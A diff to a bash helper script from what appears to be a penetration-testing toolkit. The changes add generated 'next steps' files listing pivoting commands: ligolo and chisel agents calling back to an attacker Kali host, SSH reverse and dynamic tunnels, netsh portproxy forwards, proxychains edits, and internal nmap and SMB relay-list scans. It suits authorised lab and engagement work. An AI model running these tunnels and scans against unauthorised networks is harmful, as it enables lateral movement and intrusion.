@@ -38,7 +38,15 @@ NC='\033[0m'
 disable_colors() { RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''; }
 { [[ "${NO_COLOR:-0}" == "1" ]] || [[ ! -t 1 ]]; } && disable_colors
 
-TOOLKIT_ROOT="${TOOLKIT_ROOT:-${HOME}/offsec}"
+if [[ -z "${TOOLKIT_ROOT:-}" ]]; then
+    if [[ -n "${SUDO_USER:-}" ]]; then
+        _inv_home=$(getent passwd "$SUDO_USER" 2>/dev/null | cut -d: -f6)
+        TOOLKIT_ROOT="${_inv_home:-$HOME}/offsec"
+        unset _inv_home
+    else
+        TOOLKIT_ROOT="${HOME}/offsec"
+    fi
+fi
 
 ts()      { date '+%H:%M:%S'; }
 info()    { echo -e "${BLUE}[$(ts)] [*]${NC} $*"; }
@@ -91,7 +99,7 @@ get_state_entries() {
 #------------------------------------------------------------------------------
 cleanup() {
     local exit_code="${1:-0}"
-    if [[ ${#BG_PIDS[@]} -gt 0 ]]; then
+    if [[ ${BG_PIDS+x} && ${#BG_PIDS[@]} -gt 0 ]]; then
         echo ""
         info "Cleaning up background processes..."
         local i
@@ -326,6 +334,39 @@ print_box() {
     echo ""
 }
 
+#------------------------------------------------------------------------------
+# FINDING-DRIVEN NEXT STEPS (current pivot mode only)
+#------------------------------------------------------------------------------
+init_pivot_next_steps() {
+    mkdir -p -- "$STATE_DIR"
+    {
+        echo "# Finding-Driven Pivot Next Steps"
+        echo "# Generated: $(date)"
+        echo "# Commands below are emitted only from the pivot mode/options used."
+        echo ""
+    } > "${STATE_DIR}/next_steps.txt"
+}
+
+append_pivot_next_step() {
+    local title="$1"
+    local evidence="$2"
+    shift 2
+    {
+        echo "## ${title}"
+        echo "Evidence: ${evidence}"
+        echo ""
+        local cmd
+        for cmd in "$@"; do
+            echo "$cmd"
+        done
+        echo ""
+    } >> "${STATE_DIR}/next_steps.txt"
+}
+
+show_pivot_next_steps_path() {
+    success "Pivot next steps → ${STATE_DIR}/next_steps.txt"
+}
+
 #==============================================================================
 # MODE: ligolo
 #==============================================================================
@@ -534,6 +575,24 @@ mode_ligolo() {
             "TIP: Ctrl+C exits the proxy and cleans up all background processes"
     fi
 
+    init_pivot_next_steps
+    append_pivot_next_step "Ligolo tunnel requested" \
+        "mode=ligolo subnet=${subnet} tun=${tun_name} kali=${kali_ip}" \
+        "${agent_dl_linux}" \
+        "${agent_dl_win}" \
+        "/tmp/agent -connect ${kali_ip}:${port} -ignore-cert" \
+        ".\\agent.exe -connect ${kali_ip}:${port} -ignore-cert" \
+        "session" \
+        "tunnel_start --tun ${tun_name}"
+    append_pivot_next_step "Internal enumeration after tunnel activation" \
+        "ligolo route to ${subnet} was configured" \
+        "nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>" \
+        "./recon.sh --auto <INTERNAL_HOST_IP>" \
+        "./adr.sh -dc <DC_IP> -d <DOMAIN> -u <USER> -p '<PASS>'" \
+        "nxc smb ${subnet} --gen-relay-list /tmp/smb_hosts.txt" \
+        "curl -sk http://240.0.0.1:<PIVOT_LOCAL_PORT>/"
+    show_pivot_next_steps_path
+
     # 8. Start proxy
     if [[ "$daemon" == true ]]; then
         # Daemon mode: background process, poll log for readiness, then wait
@@ -706,6 +765,7 @@ mode_ssh() {
     local kali_ip=""
     local kali_user="kali"
     local socks_port=9999
+    local subnet=""
 
     while [[ $# -gt 0 ]]; do
         case "$1" in
@@ -739,6 +799,9 @@ mode_ssh() {
             --socks-port)
                 [[ $# -lt 2 ]] && { error "--socks-port requires an argument"; return 1; }
                 socks_port="$2"; shift 2 ;;
+            --subnet)
+                [[ $# -lt 2 ]] && { error "--subnet requires an argument"; return 1; }
+                subnet="$2"; shift 2 ;;
             *)
                 error "Unknown option: $1"; return 1 ;;
         esac
@@ -765,9 +828,11 @@ mode_ssh() {
     [[ -n "$target_port" ]] && { is_valid_port "$target_port" || { error "Invalid target port: $target_port"; return 1; }; }
     [[ -n "$local_port" ]]  && { is_valid_port "$local_port" || { error "Invalid local port: $local_port"; return 1; }; }
     [[ -n "$kali_ip" ]]     && { is_valid_ip "$kali_ip" || { error "Invalid Kali IP: $kali_ip"; return 1; }; }
+    [[ -n "$subnet" ]]      && { is_valid_cidr "$subnet" || { error "Invalid subnet: $subnet"; return 1; }; }
     is_valid_port "$socks_port" || { error "Invalid socks port: $socks_port"; return 1; }
 
     phase "SSH Tunnel Reference: ${type}"
+    init_pivot_next_steps
 
     echo ""
     local sep
@@ -799,6 +864,13 @@ mode_ssh() {
             echo -e "  ${YELLOW}#   nc -zv ${target_ip} ${target_port}"
             echo -e "  ${YELLOW}# Check Kali ufw: sudo ufw status  (should be inactive or allow port)"
             echo -e "${NC}"
+            append_pivot_next_step "SSH local port forward requested" \
+                "type=local pivot=${pivot_ip}:${pivot_port} target=${target_ip}:${target_port}" \
+                "ssh -N -L 0.0.0.0:${local_port}:${target_ip}:${target_port} ${pivot_user}@${pivot_ip} -p ${pivot_port}" \
+                "curl -s --connect-timeout 3 http://localhost:${local_port}" \
+                "nc -zv localhost ${local_port}" \
+                "plink.exe -ssh ${pivot_user}@${pivot_ip} -P ${pivot_port} -L 0.0.0.0:${local_port}:${target_ip}:${target_port} -N" \
+                "netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=${local_port} connectaddress=${target_ip} connectport=${target_port}"
             ;;
 
         dynamic)
@@ -825,6 +897,15 @@ mode_ssh() {
             echo -e "  ${YELLOW}# Check pivot port is open: nc -zv ${pivot_ip} ${pivot_port}"
             echo -e "  ${YELLOW}# Kali ufw: sudo ufw status  (should be inactive or allow port)"
             echo -e "${NC}"
+            local sshuttle_cmd="# Provide --subnet CIDR to generate sshuttle command"
+            [[ -n "$subnet" ]] && sshuttle_cmd="sshuttle -r ${pivot_user}@${pivot_ip}:${pivot_port} ${subnet}"
+            append_pivot_next_step "SSH dynamic SOCKS requested" \
+                "type=dynamic pivot=${pivot_ip}:${pivot_port} socks=${socks_port}" \
+                "ssh -N -D 0.0.0.0:${socks_port} ${pivot_user}@${pivot_ip} -p ${pivot_port}" \
+                "printf 'socks5 127.0.0.1 ${socks_port}\\n' | sudo tee -a /etc/proxychains4.conf" \
+                "proxychains -q nmap -sT -Pn -p 22,80,445 <TARGET_IP>" \
+                "proxychains ./recon.sh --auto <INTERNAL_IP>" \
+                "${sshuttle_cmd}"
             ;;
 
         remote)
@@ -851,6 +932,13 @@ mode_ssh() {
             echo -e "  ${YELLOW}# Check Kali sshd GatewayPorts config: grep GatewayPorts /etc/ssh/sshd_config"
             echo -e "  ${YELLOW}# Check local port is bound: ss -tlnp | grep ${local_port}"
             echo -e "${NC}"
+            append_pivot_next_step "SSH remote port forward requested" \
+                "type=remote kali=${kali_ip} target=${target_ip}:${target_port}" \
+                "sudo systemctl start ssh" \
+                "ssh -N -R 127.0.0.1:${local_port}:${target_ip}:${target_port} ${kali_user}@${kali_ip}" \
+                "nc -zv localhost ${local_port}" \
+                "curl -s --connect-timeout 3 http://localhost:${local_port}" \
+                "grep -i '^GatewayPorts' /etc/ssh/sshd_config"
             ;;
 
         remote-dynamic)
@@ -870,11 +958,19 @@ mode_ssh() {
             echo -e "  ${YELLOW}proxychains -q curl -s --connect-timeout 5 http://<TARGET_IP>"
             echo -e "  ${YELLOW}proxychains -q nxc smb <TARGET_IP>"
             echo -e "${NC}"
+            append_pivot_next_step "SSH reverse dynamic SOCKS requested" \
+                "type=remote-dynamic kali=${kali_ip} socks=${socks_port}" \
+                "sudo systemctl start ssh" \
+                "ssh -N -R ${socks_port} ${kali_user}@${kali_ip}" \
+                "printf 'socks5 127.0.0.1 ${socks_port}\\n' | sudo tee -a /etc/proxychains4.conf" \
+                "proxychains -q nmap -sT -Pn -p 22,80,445 <TARGET_IP>" \
+                "proxychains ./recon.sh --auto <INTERNAL_IP>"
             ;;
     esac
 
     echo -e "${CYAN}${sep}${NC}"
     echo ""
+    show_pivot_next_steps_path
 }
 
 #==============================================================================
@@ -944,6 +1040,7 @@ mode_chisel() {
     fi
 
     phase "Chisel Tunnel Reference: ${type}"
+    init_pivot_next_steps
 
     echo ""
     case "$type" in
@@ -970,6 +1067,13 @@ mode_chisel() {
             echo -e "${BOLD}Then enumerate (proxychains wraps the scripts):${NC}"
             echo -e "  ${CYAN}proxychains ./recon.sh --auto <INTERNAL_IP>${NC}       # full recon"
             echo -e "  ${CYAN}proxychains ./adr.sh -dc <DC_IP> -u <USER> -p '<PASS>'${NC} # if AD"
+            append_pivot_next_step "Chisel reverse SOCKS requested" \
+                "type=socks kali=${kali_ip}:${port} socks=${socks_port}" \
+                "chisel server -p ${port} --socks5 --reverse" \
+                "chisel client ${kali_ip}:${port} R:${socks_port}:socks" \
+                "printf 'socks5 127.0.0.1 ${socks_port}\\n' | sudo tee -a /etc/proxychains4.conf" \
+                "proxychains -q nmap -sT -Pn -p 22,80,445 <INTERNAL_IP>" \
+                "proxychains ./recon.sh --auto <INTERNAL_IP>"
 
             if [[ "$start_server" == true ]]; then
                 info "Starting chisel server..."
@@ -1005,6 +1109,13 @@ mode_chisel() {
             echo -e "  ${GREEN}${client_cmd}${NC}"
             echo ""
             echo -e "${BOLD}Then access on Kali:${NC}  localhost:${local_port}"
+            append_pivot_next_step "Chisel reverse port forward requested" \
+                "type=forward kali=${kali_ip}:${port} target=${target_ip}:${target_port}" \
+                "chisel server -p ${port} --reverse" \
+                "chisel client ${kali_ip}:${port} R:${local_port}:${target_ip}:${target_port}" \
+                "nc -zv localhost ${local_port}" \
+                "curl -s --connect-timeout 3 http://localhost:${local_port}" \
+                "proxychains ./recon.sh --auto <INTERNAL_IP>   # use SOCKS mode for broad recon"
 
             if [[ "$start_server" == true ]]; then
                 info "Starting chisel server..."
@@ -1024,6 +1135,7 @@ mode_chisel() {
             ;;
     esac
     echo ""
+    show_pivot_next_steps_path
 }
 
 #==============================================================================
@@ -1300,7 +1412,7 @@ MODES:
   ssh      --type local|dynamic|remote|remote-dynamic --pivot-ip IP
            [--pivot-user USER] [--pivot-port 22] [--target-ip IP]
            [--target-port PORT] [--local-port PORT] [--socks-port 9999]
-           [--kali-ip IP] [--kali-user kali]
+           [--kali-ip IP] [--kali-user kali] [--subnet CIDR]
            → Prints fully resolved SSH tunnel command + proxychains config
 
   chisel   [--kali-ip IP] [--port 8080] [--type socks|forward]
@@ -1319,7 +1431,7 @@ EXAMPLES:
   ./pivotr.sh ligolo --subnet 10.10.10.0/24 --pivot-ip 10.10.10.5 --serve
   ./pivotr.sh ligolo2 --subnet 172.16.1.0/24
   ./pivotr.sh listener --port 4444 --port 80 --type shell
-  ./pivotr.sh ssh --type dynamic --pivot-ip 10.10.10.5 --pivot-user www-data
+  ./pivotr.sh ssh --type dynamic --pivot-ip 10.10.10.5 --pivot-user www-data --subnet 172.16.1.0/24
   ./pivotr.sh ssh --type local --pivot-ip 10.10.10.5 --target-ip 10.10.11.1 --target-port 3389
   ./pivotr.sh chisel --type socks --start-server
   ./pivotr.sh teardown --all
@@ -1371,5 +1483,10 @@ main() {
             ;;
     esac
 }
+
+if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
+    # shellcheck disable=SC2317
+    return 0 2>/dev/null || exit 0
+fi
 
 main "$@"
